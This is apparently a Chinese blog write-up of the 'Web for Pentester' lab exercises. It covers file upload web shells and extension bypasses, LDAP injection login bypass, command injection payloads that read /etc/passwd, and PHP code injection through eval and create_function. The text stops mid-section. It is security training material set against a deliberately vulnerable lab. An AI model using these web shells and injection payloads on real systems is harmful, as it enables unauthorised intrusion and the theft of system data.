
<!DOCTYPE html>
<html lang class="loading">
<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Web-For-Pentester - Knlvre</title>
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate">
    <meta name="keywords" content="TriDiamond Obsidian,"> 
    <meta name="description" content="（一）文件上传漏洞【原理】（1）在网页程序中(尤其是那些使用文件系统来决定代码运行的程序)，你可让代码在服务端执行，如果你打算用合法文件名上传文件（通常是取决于扩展），在这里，我们就可以看到基于这种,"> 
    <meta name="author" content="Knlvre"> 
    <link rel="alternative" href="atom.xml" title="Knlvre" type="application/atom+xml"> 
    <link rel="icon" href="/knlvre.github.io/img/favicon.png"> 
    <link href="https://fonts.loli.net/css?family=Roboto+Mono|Rubik&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">
    <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">
    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">
    <link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">
    <link rel="stylesheet" href="/knlvre.github.io/css/obsidian.css">
    <link rel="stylesheet" href="/knlvre.github.io/css/ball-atom.min.css">
</head>
</html>

<body class="loading">
    <div class="loader">
        <div class="la-ball-atom la-2x">
            <div></div>
            <div></div>
            <div></div>
            <div></div>
        </div>
    </div>
    <span id="config-title" style="display:none">Knlvre</span>
    <div id="loader"></div>
    <div id="single">
    <div class="scrollbar gradient-bg-rev"></div>
<div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <div class="navigation animated fadeIn fast delay-1s">
        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="https://knlvre.github.io">
        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
        <h3 class="subtitle">Web-For-Pentester</h3>
        <div class="social">
            <!--        <div class="like-icon">-->
            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
            <!--        </div>-->
            <div>
                <div class="share">
                    
                        <a href="javascript:;" class="iconfont icon-share1"></a>
                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
                    
                </div>
            </div>
        </div>
    </div>
</div>

    <div class="section">
        <div class=article-header-wrapper>
    <div class="article-header">
        <div class="article-cover animated fadeIn" style="
            animation-delay: 600ms;
            animation-duration: 1.2s;
            background-image: 
                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
                url(/img/cover.jpg);">
        </div>
        <div class="else">
            <p class="animated fadeInDown">
                
                <a href="javascript:;"><b>「 </b>Article<b> 」</b></a>
                
                March 11, 2019
            </p>
            <h3 class="post-title animated fadeInDown"><a href="/knlvre.github.io/2019/03/11/Web-For-Pentester/" title="Web-For-Pentester">Web-For-Pentester</a>
            </h3>
            
            <p class="post-count animated fadeInDown">
                
                <span>
                    <b class="iconfont icon-text2"></b> <i>Words count</i>
                    65k
                </span>
                
                
                <span>
                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
                    59 mins.
                </span>
                
                
                
                <span id="busuanzi_container_page_pv">
                    <b class="iconfont icon-read"></b> <i>Read count</i>
                    <span id="busuanzi_value_page_pv">0</span>
                </span>
                
            </p>
            
            
            <ul class="animated fadeInDown post-tags-list"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/knlvre.github.io/tags/基础知识点/">基础知识点</a></li></ul>
            
        </div>
    </div>
</div>

<div class="screen-gradient-after">
    <div class="screen-gradient-content">
        <div class="screen-gradient-content-inside">
            <div class="bold-underline-links screen-gradient-sponsor">
                <p>
                    <span class="animated fadeIn delay-1s"></span>
                </p>
            </div>
        </div>
    </div>
</div>

<div class="article">
    <div class='main'>
        <div class="content markdown animated fadeIn">
            <h1 id="（一）文件上传漏洞"><a href="#（一）文件上传漏洞" class="headerlink" title="（一）文件上传漏洞"></a>（一）文件上传漏洞</h1><h2 id="【原理】"><a href="#【原理】" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）在网页程序中(尤其是那些使用文件系统来决定代码运行的程序)，你可让代码在服务端执行，如果你打算用合法文件名上传文件（通常是取决于扩展），在这里，我们就可以看到基于这种类型的攻击</p>
<p>（2)首先，我们攻击一个PHF的应用，我们需要一个PHF的webshel1，一个Webshell就是一段简单的脚本或者执行代码的网页应用，比如，在PHP中，下面的代码就是一个简单的web shell:<br>&lt;?php</p>
<p>system($_GET[‘emd’]):</p>
<p>?&gt;</p>
<p>（3)越复杂的webshel1可以执行越高级的操作，比如教据库和文件系统的访问，甚至是TCP随道。</p>
<h2 id="【步骤】"><a href="#【步骤】" class="headerlink" title="【步骤】"></a>【步骤】</h2><p>一、Example 1 </p>
<p>1.1 源代码</p>
<p>1.1 看看实验的example1.php的源代码，这是一个非常基础的表单，对上传的文件类型没有限制</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1-1.png" alt="1-1"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1-2.png" alt="1-2"></p>
<p>1.2 创建简单webshell文件</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1-3.png" alt="1-3"></p>
<p>1.3 上传webshell文件</p>
<p>访问example.php，将刚才创建的webshell文件上传上去</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1-4.png" alt="1-4"></p>
<p>1.4 跳转</p>
<p>上传成功会提示”Upload done Your file can be found here”，点击这个”here”连接，跳转到a.php</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1-5.png" alt="1-5"></p>
<p>1.5 cmd没有赋值</p>
<p>因为cmd变量没有赋值，所以进行报错</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1-6.png" alt="1-6"></p>
<p>1.6 赋值为ls</p>
<p>给cmd赋值为ls，可以罗列当前目录下的所有文件和目录</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1-7.png" alt="1-7"></p>
<p>1.7 赋值为pwd</p>
<p>给cmd赋值为pwd，可以查看当前目录</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/1-8.png" alt="1-8"></p>
<hr>
<p>二、Example2</p>
<p>总结：</p>
<pre><code>.php后缀可以换成：
.php3、.php4、.php5
.blah
</code></pre><p>2.1 example2.php的源代码</p>
<p>相比于example1.php只多了对文件名的限制，上传的文件名不能以.php结尾</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2-1.png" alt="2-1"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2-2.png" alt="2-2"></p>
<p>2.2 绕过限制</p>
<p>想要绕过这类的限制，可以用一下方法：</p>
<p>（1）将拓展名改为<strong>.php3</strong>，在其他一些系统中，像这类<strong>.php4</strong>或者<strong>.php5</strong>的可能也能访问，这取决于web服务器如何解析</p>
<p>（2）使用Apache不认识的拓展名，在.php后跟上<strong>.blah</strong>，一旦Apache无法解析这类拓展名，它就会移动到下一个，.php则随即被解析，然后运行其php代码</p>
<p>2.3 写一句话木马</p>
<pre><code>&lt;?php $eval($_POST[&#39;123456&#39;]);?&gt;
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2-3.png" alt="2-3"></p>
<p>2.4 上传时报错</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2-4.png" alt="2-4"></p>
<p>2.5 修改后缀名后再上传</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2-5.png" alt="2-5"></p>
<p>上传成功</p>
<p>2.6 使用菜刀连接</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2-6.png" alt="2-6"></p>
<p>成功连接</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%80%EF%BC%89%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/2-7.png" alt="2-7"></p>
<hr>
<h1 id="（二）LDAP-attacks"><a href="#（二）LDAP-attacks" class="headerlink" title="（二）LDAP attacks"></a>（二）LDAP attacks</h1><h2 id="【原理】-1"><a href="#【原理】-1" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）LDAP是轻量目录访问协议，英文全称是Lightweight Directory Access Protocol,一般都简称为LDAP。它是基于X.500标准的，但是简单多了并且可以根据需要定制。与x.500不同，LDAP支持TCP/IP，这对访问Internet是必须的。LDAP的核心规范在RFC中都有定义，所有与LDAP相关的RFC都可以在LDAPman RFC网页中找到。<br>（2）LDAP通常被用来后端验证，特别是用在登入进制（SSO）的解决方案中。最常见的LDAP注入模式是注入过滤器。这里示例2会演示如果用LDAP注入绕过登录验证。首先，你需要学习一点LDAP语法。当你要检索一个用户的时候，通过这个用户名，可以用如下的语句：(en=[INPUT])<br>（3）如果你要增加更多的条件或者布尔逻辑，你可以使用：布尔或：(|(cn=[输入1])(cn=[输入2]))能得到匹配输入1和输入<br>2的记录。布尔与：(&amp;(cn=[输入1]（userPassword=[输入2])）能得到cn匹配输入1和userPassword匹配输入2的记录<br>（4）就如看到的那样，布尔逻辑体现在语句开始的过滤符。由于是在布尔字符后面开始注入的，所以通常不可能对布尔符号发起注入攻击。<br>（5）LDAP经常用·通配符来匹配任意值。这可以被用来匹配任何值比如<em>，或者子串比如adn</em>匹配所有以adn开头的值。<br>（6）正如其他注入攻击一样，我们要移除任何服务端添加的代码我们用空值可以绕过末尾的过滤器。</p>
<h2 id="【步骤】-1"><a href="#【步骤】-1" class="headerlink" title="【步骤】"></a>【步骤】</h2><h4 id="一、Example1"><a href="#一、Example1" class="headerlink" title="一、Example1"></a>一、Example1</h4><p>1.1 源代码</p>
<p>LDAP attacks Example的源代码example.php如下</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%8C%EF%BC%89LDAP%20attacks/1-1.png" alt="1-1"></p>
<p>1.2 提交用户名和密码</p>
<p>通过GET方式提交用户名和密码，都是hacker，来登录LDAP服务器。但是LDAP服务器拒绝登录，因为提供的认证信息是无效的</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%8C%EF%BC%89LDAP%20attacks/1-2.png" alt="1-2"></p>
<p>1.3 删除username和password的参数</p>
<p>删除username和password的参数hacker。如果发送这样的请求username=&amp;password=，这样的值是不会奏效的，因为他们并不是NULL，相应的他们其实算做空变量。空变量登录测试在将来你所有的测试中是个相当重要的测试，即便后端服务器用的不是LDAP认证机制</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%8C%EF%BC%89LDAP%20attacks/1-3.png" alt="1-3"></p>
<p>1.4 匿名认证</p>
<p>但是有一些LDAP服务器允许空值绑定：如果发送的是空值，LDAP服务器会绑定这个链接，然后PHP程序会认为这个认证信息是正确的。为了绑定两个空值，需要在发送的请求中完全移除认证变量信息。如删除所有认证变量信息，提示AUTHENTICHTED，说明匿名认证成功</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%8C%EF%BC%89LDAP%20attacks/1-4.png" alt="1-4"></p>
<p>二、Example2</p>
<p>2.1 源代码</p>
<p>LDAP attacks Example2的源代码example2.php如下</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%8C%EF%BC%89LDAP%20attacks/2-1.png" alt="2-1"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%8C%EF%BC%89LDAP%20attacks/2-1-2.png" alt="2-1-2"></p>
<p>2.2 正常登陆请求</p>
<p>GET提交：?name=hacker&amp;password=hacker，提示：AUTHENTICHTED as hacker</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%8C%EF%BC%89LDAP%20attacks/2-2.png" alt="2-2"></p>
<p>2.3 通过*通配符匹配一些相同的值</p>
<p>注意图中URL的变化，结果还是和上一步一样</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%8C%EF%BC%89LDAP%20attacks/2-3.png" alt="2-3"></p>
<p>2.4 password加上*通配符，失败</p>
<p>password加上*通配符时，登陆失败，密码可能被加密（如哈希）后再进行匹配</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%8C%EF%BC%89LDAP%20attacks/2-4.png" alt="2-4"></p>
<p>2.5 总结</p>
<p>结果很明显，我们可以利用LDAP注入攻击，在username参数动手脚实施登录绕过。<br>（1）根据之前的则式结果，可以推断出过器的可能构造：(&amp;(cn=[IMPUT1])(userPassword=HASH[INPUT2]))<br>2)这里哈希不是加盐的哈希(可能是加5或者SHA1）。LDAP支持用如下格式对密码进行加密：’{ICLEARTEXT}’，’{MD5}’，’{SMD5}’（加盐加5），’{SHA1}’，’{SSHA}’（加盐加5）和’{CRYPT}’等来保存密码。<br>3）由于输入值2是被哈希过的，所以我们不能在这里进行注入。我们这里的目标就是向[input1]注入(用户名参数）。我们需要注意：<br>1.当前的过滤末尾使用hacker)<br>2.恒等式(如(cn=+))<br>3.使用有效语法<br>4.使用空字符（%00）来避免尾部的过滤<br>4）一旦你满足这几个条件，你应该就可以使用hacker帐户登录，任何密码均可。然后你就能使用通配符来找到其它的用户了。举个例子，你可以在过滤器第一部分使用a*，然后检查你自己是作为什么身份登陆的。<br>5）在大多数案例中，LDAP注入仅仅能帮助你绕过验证和加权认证，但想要检索任意数据很多时候都很困难或者根本不可能。</p>
<p>2.6 username使用空字符</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%8C%EF%BC%89LDAP%20attacks/2-6.png" alt="2-6"></p>
<p>2.7 username直接换成admin</p>
<p>将username直接换成admin，提示以admin身份登陆</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%BA%8C%EF%BC%89LDAP%20attacks/2-7.png" alt="2-7"></p>
<hr>
<h1 id="（三）命令注入"><a href="#（三）命令注入" class="headerlink" title="（三）命令注入"></a>（三）命令注入</h1><h2 id="【原理】-2"><a href="#【原理】-2" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）命令注入攻击来自于缺少对被当作命令执行的输入部分进行有效的过滤或者编码。最简单的一个例子是利用system函数来执行，并且使用接收到的http参数作为有效输入变量</p>
<p>（2）许多方式可以执行命令注入攻击，如：</p>
<ul>
<li>在反引号对中注入命令，比如<strong>‘id’</strong></li>
<li>把第一个命令的结果重定向到第二个中去，比如 <strong>| id</strong></li>
<li>如果第一个命令被成功执行，可以尝试执行更多的命令：<strong>&amp;&amp; id</strong>（这里&amp;需要被编码）</li>
<li>在一个失败的命令后执行另一个命令：<strong>error || id</strong>（这里的error就只是为了制造一个错误）</li>
<li>这里也可以用相同值技巧来检测这种漏洞。比如，把123替换成<strong>‘echo123’</strong>。在反引号里面的代码会先被执行，但是返回的结果和没有更改过的返回的页面一样。</li>
</ul>
<p>（4）你也可以用基于时间的载体来检则这种类型的漏洞。你可以引入需要服务器消耗时间来执行的命令来检则洞（可能会有造成拒绝服务攻击的风险）。你可以用sleep命令让服务器等待一段时间继续执行命令。比如用sleep 10</p>
<h2 id="【步骤】-2"><a href="#【步骤】-2" class="headerlink" title="【步骤】"></a>【步骤】</h2><p>一、Example1</p>
<p>1.1 源代码</p>
<p>简单的命令执行漏洞例子，开发者不做任何的输入验证，你可以直接在ip参数后注入你的命令</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%89%EF%BC%89%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1-1.png" alt="1-1"></p>
<p>1.2 重定向</p>
<pre><code>?ip=127.0.0.1 | cat /etc/passwd
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%89%EF%BC%89%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1-2.png" alt="1-2"></p>
<p>1.3 重定向2</p>
<p>可以将IP地址写错，然后把<strong>|</strong>改成<strong>||</strong></p>
<pre><code>?ip=127.0.0 || cat /etc/passwd
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%89%EF%BC%89%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1-3.png" alt="1-3"></p>
<p>二、Example2</p>
<p>2.1 源代码</p>
<p>添加了正则匹配的例子。在Example2中，开发者有经验提供的参数，但是用了不是很正确的方式。就像我们之前看到sql注入漏洞那样，利用的是多行的正则表达式。使用和在sql注入漏洞一样的技巧，你可以轻易地利用代码执行漏洞。这里比较方便的是你不在考虑注入分隔符，你只要注入编码的新代码（%0a），然后加上你要执行的命令</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%89%EF%BC%89%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2-1.png" alt="2-1"></p>
<p>2.2 重定向</p>
<pre><code>?ip=127.0.0.1%0Acat /etc/passwd
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%89%EF%BC%89%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2-2.png" alt="2-2"></p>
<p>三、Example3</p>
<p>3.1 源代码</p>
<p>没有正确的停止执行脚本例子。开发者没有正确的停止执行脚本。在PHP中，如果用户的提供的输入触发了某些安全规则的时候可以调用header函数非常简便的实现页面重定向。但是，就算浏览器会被重定向，这个函数并不会停止执行过程，脚本仍然会将危险的语句执行完<br>毕。开发者需要在调用header面数后接着调用die通数未避免这个危险的错误</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%89%EF%BC%89%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3-1.png" alt="3-1"></p>
<p>3.2 输入url</p>
<p>输入url，无法得到passwd文件的内容，且回到初始页面</p>
<pre><code>?ip=127.0.0.1%0Acat /etc/passwd
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%89%EF%BC%89%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3-2.png" alt="3-2"></p>
<p>回车后回到初始页面</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%89%EF%BC%89%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3-2-2.png" alt="3-2-2"></p>
<p>3.3 利用 curl 获取信息</p>
<p>打开cmd，输入：</p>
<pre><code>cd C:\tools\curl
</code></pre><p>再输入：</p>
<pre><code>curl &quot;...?ip=127.0.0.10xacat0x20/etc/passwd&quot;
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%89%EF%BC%89%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3-3.png" alt="3-3"></p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E4%B8%89%EF%BC%89%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3-3-2.png" alt="3-3-2"></p>
<hr>
<h1 id="（四）代码注入"><a href="#（四）代码注入" class="headerlink" title="（四）代码注入"></a>（四）代码注入</h1><h2 id="【原理】-3"><a href="#【原理】-3" class="headerlink" title="【原理】"></a>【原理】</h2><p>（1）代码执行漏洞是因为对用户控制的输入数据没有进行恰当的过滤和转义。当你执行一个代码注入漏洞，你要在发送给web应用程序的数据中添加你的注入代码。比如，你想要执行<strong>ls</strong>命令，你要发送<strong>system(“l”)</strong>，因为这是个php程序<br>（2）就像其他web漏洞的例子一样，通常很难知道怎么注释掉剩下的代码（比如程序在用户控制的数据后添加的代码）。在PHP中，你可以用<strong>//</strong>来绕过被添加的代码<br>和SQL注入漏洞一样，你可以用同样的技巧来测试并且确保你的注入代码被执行：</p>
<ul>
<li>用注释符来执行注入</li>
<li>用一个简单连接符<strong>”.”</strong>来注入（这里”用来打断语句并且正确的重组语句）</li>
<li>用字符串连接符来构造变量，比如用<strong>”.”ha”.”cker”</strong>来替代hacker</li>
</ul>
<p>（3）你还可以用基于时间的检测方式来定位漏洞，要用到php的sleep函数。下面两个例子也有不同的时间相应：</p>
<ul>
<li>不使用sleep函数或者用零时间延迟函数：sleep(0)</li>
<li>用时间函数引入较长的延时：sleep(10)</li>
</ul>
<h2 id="【步骤】-3"><a href="#【步骤】-3" class="headerlink" title="【步骤】"></a>【步骤】</h2><p>一、Example1</p>
<p>1.1 源代码</p>
<p>简单的例子，代码中使用了函数eval()，这是一个相当简单的代码注入例子</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1-1.png" alt="1-1"></p>
<p>1.2 输入代码</p>
<pre><code>?name=hacker&quot;;phpinfo();&quot;
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/1-2.png" alt="1-2"></p>
<p>二、Example2</p>
<p>2.1 源代码</p>
<p>代码中使用了usort()函数和create_function()函数。在给某些信息排序的时候，开发者通常用两种方式，一是通过SQL请求来排序，二是利用PHP的usort函数。usort()函数通常和create_function()函数一起使用，用来根据用户控制的输入信息来动态的产生排序函数。如果web应用程序缺少严格的过滤和检验就可能导致代码执行漏洞的产生</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2-1.png" alt="2-1"></p>
<p>2.2 输入url</p>
<pre><code>?order=phpinfo()
</code></pre><p>报错</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2-2.png" alt="2-2"></p>
<p>2.3 更改url</p>
<pre><code>?order=phpinfo();//
</code></pre><p>还是报错</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2-3.png" alt="2-3"></p>
<p>2.4 更改url</p>
<pre><code>?order=id);phpinfo();//
</code></pre><p>还是报错</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2-4.png" alt="2-4"></p>
<p>2.5 更改url</p>
<pre><code>?order=id)};phpinfo();//
</code></pre><p>还是报错</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2-5.png" alt="2-5"></p>
<p>2.6 更改url，成功得到PHP信息</p>
<pre><code>?order=id);}phpinfo();//
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2-6.png" alt="2-6"></p>
<p>2.7 获取目标系统信息</p>
<pre><code>?order=id);};system(&#39;uname -a&#39;);//
</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/2-7.png" alt="2-7"></p>
<p>三、Example 3</p>
<p>3.1 源代码</p>
<p>代码中使用了preg_replace()函数。在PHP中有一个非常危险的修饰符：preg_replace_eval()函数，这个修饰符会导致在执行替换之前preg_replace函数把新值当做PHP代码来执行（preg_replace_eval()函数在PHP5.0开始被剔除）</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3-1.png" alt="3-1"></p>
<p>3.2 由URL可知用的应该是正则表达式</p>
<p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/Web-For-Pentester/%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/3-2.png" alt="3-2"></p>
<p>3.3 </p>
<p>我们知道PHP很大部分关于code injection的漏洞都来自对于PCRE(Perl Compatible Regular Expression)的使用不当。PCRE被用于使用正则表达式，如preg_match和preg_replace。正常情况下，它是安全的，不过当在正则表达式后使用/e时，它允许PHP function添加一个callback</p>
